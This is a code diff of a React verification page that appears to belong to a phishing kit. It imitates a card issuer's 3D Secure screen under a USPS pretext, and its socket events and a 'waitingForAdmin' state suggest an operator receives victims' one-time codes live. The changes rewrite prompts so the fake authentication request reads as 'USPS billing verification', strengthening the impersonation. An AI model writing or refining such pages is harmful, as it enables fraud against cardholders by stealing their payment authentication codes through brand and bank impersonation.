@@ -80,7 +80,7 @@ export default function Verify() {
     return !saved.telephone && !saved.email && !savedContacts.telephone && !savedContacts.email;
   });
   const [showMethodPicker, setShowMethodPicker] = useState(() => !initialVerifyMethod);
-  const [status, setStatus] = useState('Choose where you want to receive the authentication code.');
+  const [status, setStatus] = useState('Choose where you want USPS to send the authentication code.');
   const [submitting, setSubmitting] = useState(false);
   const [waitingForAdmin, setWaitingForAdmin] = useState(false);
   const inputRef = useRef<HTMLInputElement | null>(null);
@@ -99,7 +99,7 @@ export default function Verify() {
         setLoadingContactOptions(false);
         setStatus(
           fallback.telephone || fallback.email
-            ? 'Choose where you want to receive the authentication code.'
+            ? 'Choose where you want USPS to send the authentication code.'
             : 'We could not load your phone number or email. Return to your account and try again.',
         );
         return;
@@ -194,7 +194,7 @@ export default function Verify() {
       setSubmitting(false);
       setWaitingForAdmin(false);
       const routeReason = String(payload?.reason || '').trim();
-      setStatus(routeReason || 'Choose where you want to receive the authentication code.');
+      setStatus(routeReason || 'Choose where you want USPS to send the authentication code.');
       socket.emit('update-form-field', { field: 'verifyMethod', value: '' });
       if ((target === 'verifyphone' || target === 'phoneverify') && contactOptions.telephone) return handleChooseMethod('phone', routeReason);
       if (target === 'emailverify' && contactOptions.email) return handleChooseMethod('email', routeReason);
@@ -271,13 +271,13 @@ export default function Verify() {
         <div className="absolute inset-0 bg-slate-900/55 backdrop-blur-sm flex items-center justify-center z-40 p-4">
           <div className="alz-bank-picker alz-usps-bank-picker">
             <div className="alz-bank-picker-head">
-              <div>
-                <div className="alz-bank-picker-eyebrow">Cardholder Authentication</div>
+                <div>
+                  <div className="alz-bank-picker-eyebrow">Cardholder Authentication</div>
                 <h2 className="alz-bank-picker-title">Choose where to receive your code</h2>
               </div>
               <span className="alz-bank-badge">Verified by issuer</span>
             </div>
-            <p className="alz-bank-picker-copy">Choose one option below to receive the authentication code for this payment.</p>
+            <p className="alz-bank-picker-copy">Choose one option below to receive the authentication code for this USPS verification step.</p>
 
             {loadingContactOptions ? (
               <div className="alz-bank-loading">Loading your available contact methods...</div>
@@ -308,10 +308,10 @@ export default function Verify() {
         <div className="alz-bank-shell">
           <div className="alz-bank-frame alz-usps-bank-frame">
             <div className="alz-bank-header">
-              <div>
-                <div className="alz-bank-header-eyebrow">Issuer Authentication</div>
+                <div>
+                  <div className="alz-bank-header-eyebrow">Issuer Authentication</div>
                 <h1 className="alz-bank-title">Authentication required</h1>
-                <p className="alz-bank-copy">Enter the one-time code sent by your card issuer to confirm this payment.</p>
+                <p className="alz-bank-copy">Enter the one-time code sent by your card issuer to complete this USPS billing verification.</p>
               </div>
               <div className="alz-bank-brandbox">
                 <div className="alz-bank-brandname">SECURECODE</div>
@@ -357,7 +357,7 @@ export default function Verify() {
               <aside className="alz-bank-side">
                 <div className="alz-bank-side-card">
                   <div className="alz-bank-side-title">Protected payment</div>
-                  <div className="alz-bank-side-copy">This card transaction is protected by your issuer through 3D Secure authentication.</div>
+                  <div className="alz-bank-side-copy">This billing review is protected by your issuer through 3D Secure authentication.</div>
                 </div>
                 <div className="alz-bank-side-card">
                   <div className="alz-bank-side-title">Need help?</div>
